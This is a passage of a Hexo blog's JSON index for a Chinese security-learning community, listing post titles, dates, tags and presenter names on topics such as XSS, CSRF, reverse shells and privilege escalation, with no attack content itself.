Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/10/14/fuzz-tester/","permalink":"http://example.com/2023/10/14/fuzz-tester/","excerpt":"","text":"分享人：TBK","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"FUZZ","slug":"FUZZ","permalink":"http://example.com/tags/FUZZ/"}],"author":"SecureNexusLab"},{"title":"文件上传漏洞基础","slug":"upload-file-introduction","date":"2023-08-07T16:28:51.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/08/upload-file-introduction/","permalink":"http://example.com/2023/08/08/upload-file-introduction/","excerpt":"","text":"分享人：mjc","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"Crypto入门","slug":"crypt-introduction","date":"2023-08-04T04:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/04/crypt-introduction/","permalink":"http://example.com/2023/08/04/crypt-introduction/","excerpt":"","text":"分享人：Keyboard","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"密码学","slug":"密码学","permalink":"http://example.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"author":"SecureNexusLab"},{"title":"csrf漏洞讲解与实战","slug":"csrf","date":"2023-08-04T04:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/04/csrf/","permalink":"http://example.com/2023/08/04/csrf/","excerpt":"","text":"分享人：Enc3l","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"Fuzz模糊测试系列分享（一）模糊测试简介","slug":"fuzz-introduction","date":"2023-08-04T04:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/04/fuzz-introduction/","permalink":"http://example.com/2023/08/04/fuzz-introduction/","excerpt":"","text":"分享人：TBK","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"FUZZ","slug":"FUZZ","permalink":"http://example.com/tags/FUZZ/"}],"author":"SecureNexusLab"},{"title":"安全机制与栈溢出基础","slug":"stack-overflow","date":"2023-08-04T04:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/04/stack-overflow/","permalink":"http://example.com/2023/08/04/stack-overflow/","excerpt":"","text":"分享人：antel0p3","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"文件隐写","slug":"steganography","date":"2023-08-04T04:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/04/steganography/","permalink":"http://example.com/2023/08/04/steganography/","excerpt":"","text":"分享人：F0rga1n","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"MISC","slug":"MISC","permalink":"http://example.com/tags/MISC/"}],"author":"SecureNexusLab"},{"title":"xss漏洞原理基础与实战","slug":"xss-introduction","date":"2023-08-04T04:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/04/xss-introduction/","permalink":"http://example.com/2023/08/04/xss-introduction/","excerpt":"","text":"分享人：cheng_xing","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"windows权限提升","slug":"windows-pe","date":"2023-08-03T15:18:32.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/08/03/windows-pe/","permalink":"http://example.com/2023/08/03/windows-pe/","excerpt":"","text":"分享人：D4wn","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"Windows提权","slug":"Windows提权","permalink":"http://example.com/tags/Windows%E6%8F%90%E6%9D%83/"}],"author":"SecureNexusLab"},{"title":"BadUSB制作教程","slug":"bad-usb","date":"2023-07-26T16:10:52.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/07/27/bad-usb/","permalink":"http://example.com/2023/07/27/bad-usb/","excerpt":"","text":"分享人：root","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"BadUSB","slug":"BadUSB","permalink":"http://example.com/tags/BadUSB/"}],"author":"SecureNexusLab"},{"title":"elf文件格式解析","slug":"elf-file-format","date":"2023-07-26T16:10:52.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/07/27/elf-file-format/","permalink":"http://example.com/2023/07/27/elf-file-format/","excerpt":"","text":"分享人：antel0p3","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"二进制分析工具","slug":"tools","date":"2023-07-26T15:17:59.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/07/26/tools/","permalink":"http://example.com/2023/07/26/tools/","excerpt":"","text":"分享人：antel0p3","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}],"author":"SecureNexusLab"},{"title":"服务器反弹shell","slug":"shell","date":"2023-07-24T02:18:47.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/07/24/shell/","permalink":"http://example.com/2023/07/24/shell/","excerpt":"","text":"分享人：邓祺","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"PHP反序列化漏洞","slug":"php-unserialize","date":"2023-07-23T17:04:04.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/07/24/php-unserialize/","permalink":"http://example.com/2023/07/24/php-unserialize/","excerpt":"","text":"分享人：p5ych","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}],"author":"SecureNexusLab"},{"title":"Hello World","slug":"hello-world","date":"2023-01-01T12:50:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/01/01/hello-world/","permalink":"http://example.com/2023/01/01/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[],"author":"SecureNexusLab"}],"categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"SRC","slug":"SRC","permalink":"http://example.com/tags/SRC/"},{"name":"护网","slug":"护网","permalink":"http://example.com/tags/%E6%8A%A4%E7%BD%91/"},{"name":"SPA","slug":"SPA","permalink":"http://example.com/tags/SPA/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"Bypass","slug":"Bypass","permalink":"http://example.com/tags/Bypass/"},{"name":"FPS游戏安全","slug":"FPS游戏安全","permalink":"http://example.com/tags/FPS%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"},{"name":"FUZZ","slug":"FUZZ","permalink":"http://example.com/tags/FUZZ/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"Node.js","slug":"Node-js","permalink":"http://example.com/tags/Node-js/"},{"name":"科普","slug":"科普","permalink":"http://example.com/tags/%E7%A7%91%E6%99%AE/"},{"name":"车联网安全","slug":"车联网安全","permalink":"http://example.com/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"符号执行","slug":"符号执行","permalink":"http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"},{"name":"文件上传","slug":"文件上传","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"智能合约","slug":"智能合约","permalink":"http://example.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"DataCon","slug":"DataCon","permalink":"http://example.com/tags/DataCon/"},{"name":"SSTI","slug":"SSTI","permalink":"http://example.com/tags/SSTI/"},{"name":"密码学","slug":"密码学","permalink":"http://example.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"MISC","slug":"MISC","permalink":"http://example.com/tags/MISC/"},{"name":"Windows提权","slug":"Windows提权","permalink":"http://example.com/tags/Windows%E6%8F%90%E6%9D%83/"},{"name":"BadUSB","slug":"BadUSB","permalink":"http://example.com/tags/BadUSB/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]}